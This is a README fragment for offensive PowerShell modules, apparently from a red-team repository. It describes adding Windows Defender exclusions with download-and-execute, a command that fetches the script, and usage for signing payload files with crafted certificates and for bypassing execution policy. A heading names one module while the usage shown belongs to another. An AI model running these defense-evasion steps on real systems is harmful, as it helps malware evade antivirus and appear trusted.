## Module Name
   <b><i>Invoke-Exclusions.ps1</i></b>

|Cmdlet name|Description|Privileges|Notes|
|---|---|---|---|
|Invoke-Exclusions|Add exclusions (Set-MpPreference) + Download\Execute url cmdlet|Administrator|[Screenshot](https://null)|

```powershell
iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/WD-Bypass/Invoke-Exclusions.ps1" -OutFile "Invoke-Exclusions.ps1"
```

```powershell
Get-Help .\Invoke-LazySign.ps1 -full

#Query for ALL certificates in 'Cert:\LocalMachine\My | Cert:\LocalMachine\Root' Store
.\Invoke-LazySign.ps1 -Action "query" -Subject "[a-z 0-9]"

#Query for ALL 'LazySign' certs in 'Cert:\LocalMachine\My | Cert:\LocalMachine\Root' Store
.\Invoke-LazySign.ps1 -Action "query" -Subject "LazySign"

#Sign binary (Payload.exe) with crafted certificate (Subject: LazySign-4zrH Expires: 6 months)
.\Invoke-LazySign.ps1 -Action 'Sign' -Subject "LazySign" -Target "$pwd\Payload.exe" -NotAfter "6"

#Sign binary (Payload.ps1) with crafted certificate (Subject: LazySign-4zrH Expires: 3 months)
.\Invoke-LazySign.ps1 -Action 'sign' -Subject "LazySign" -Target "Payload.ps1" -NotAfter "3"

#Delete the 'LazySign-4zrH' certificate from windows store
.\Invoke-LazySign.ps1 -Action 'del' -Subject "LazySign-4zrH"

```

<br />

## Final Notes
```
Do 'NOT' edit the signed binary\cmdlet after its being signed, or else the certificate code block
inside signed binary\cmdlet will brake, rending the signed binary\cmdlet as 'NOT-SIGNED' again.

Do 'NOT' use Regex when invoking -Action 'del' to delete certificates from the Windows Store.
Because Invoke-LazySign.ps1 cmdlet uses recursive search by default (deleting multiple certs)
This function as a precaution it asks for comfirmation before deleting the certificate(s).

This cmdlet will 'NOT' sign our script.ps1 if 'Set-ExecutionPolicy AllSigned,RemoteSigned' are set.
Because ExecutionPolicy will prevent this cmdlet from running. If you wish to bypass this restrictions
then execute the 'PSscriptSigning.bat' batch module contained in this same repository (the first module)
```

Article: https://github.com/r00t-3xp10it/hacking-material-books/blob/master/obfuscation/working-with-certificates.md

